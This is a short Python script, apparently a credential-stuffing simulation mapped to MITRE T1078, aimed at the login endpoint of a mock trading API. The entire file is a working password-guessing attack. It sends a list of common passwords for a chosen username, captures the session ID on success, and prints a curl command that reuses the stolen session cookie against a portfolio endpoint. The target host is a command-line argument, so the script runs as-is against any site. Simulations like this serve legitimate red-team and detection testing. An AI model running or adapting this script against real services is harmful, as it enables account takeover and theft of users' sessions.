#!/usr/bin/env python3
"""
T1078 Valid Accounts — Credential Stuffing Simulation
Target: POST /api/login on mock-trading-api
"""
import requests
import sys
import time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://mock-trading-api:5000"
USERNAME = sys.argv[2] if len(sys.argv) > 2 else "trader1"
WORDLIST = [
    "password", "123456", "qwerty", "admin", "letmein",
    "password123", "welcome1", "trader2024", "capital", "money"
]

def spray():
    print(f"[*] Starting credential stuffing against {TARGET}/api/login")
    print(f"[*] Target user: {USERNAME}")
    print(f"[*] Wordlist size: {len(WORDLIST)}")
    print("-" * 50)

    for pwd in WORDLIST:
        resp = requests.post(f"{TARGET}/api/login", data={
            "username": USERNAME,
            "password": pwd
        }, timeout=5)

        status = resp.status_code
        if status == 200:
            data = resp.json()
            print(f"[+] SUCCESS: {USERNAME}:{pwd} -> session={data.get('session_id','')}")
            return data.get('session_id')
        elif status == 429:
            print(f"[!] ACCOUNT LOCKED after password: {pwd}")
            print(f"    Response: {resp.json()}")
            return None
        else:
            print(f"[-] FAILED: {USERNAME}:{pwd} (HTTP {status})")
        time.sleep(0.5)

    print("[!] No valid credentials found in wordlist")
    return None

if __name__ == "__main__":
    session = spray()
    if session:
        print(f"\n[*] Session ID: {session}")
        print(f"[*] Test with: curl -H 'Cookie: session_id={session}' {TARGET}/api/portfolio")
